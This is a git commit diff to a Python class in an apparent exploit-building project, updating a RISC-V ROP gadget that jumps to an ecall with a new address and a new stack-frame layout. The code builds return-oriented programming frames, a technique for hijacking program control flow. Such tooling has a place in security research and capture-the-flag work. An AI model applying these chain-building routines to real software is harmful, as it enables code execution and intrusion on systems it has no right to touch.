639af80779ae48ccb663579c08fdf30aa63dd82c
tifui-alexandru <itifui00@gmail.com>
2022-05-29 14:09:10 +0300

    ecall updated

--- bf_parser/rop_gadgets/ecall.py
+++ bf_parser/rop_gadgets/ecall.py
@@ -3,20 +3,22 @@ from bf_parser.rop_gadgets_base_class import ROP_Gadget
 class Ecall(ROP_Gadget):
     '''
     ecall
-    j	0x1d9fa
+    j	0x14bdc
 
-    0x1d9fa:
-    ld ra, 0x18(sp)
-    ld s0, 0x10(sp)
-    ld s1, 0x8(sp)
-    ld s2, 0(sp)
-    addi sp, sp, 0x20
+    0x14bdc:
+    ld ra, 0x38(sp)
+    ld s0, 0x30(sp)
+    ld s1, 0x28(sp)
+    ld s2, 0x20(sp)
+    ld s3, 0x18(sp)
+    mv a0, a4
+    addi sp, sp, 0x40
     jr ra
     '''
     def __init__(self):
-        super().__init__(0x1da3c, 0x20)
+        super().__init__(0x14c22, 0x40)
 
-    def construct_frame(self, ra=0, s0=0, s1=0, s2=0):
-        data = [s2, s1, s0, ra]
+    def construct_frame(self, ra=0, s0=0, s1=0, s2=0, s3=0):
+        data = [0, 0, 0, s3, s2, s1, s0, ra]
         self.set_stack_frame(data)
         return self.print_gadget()
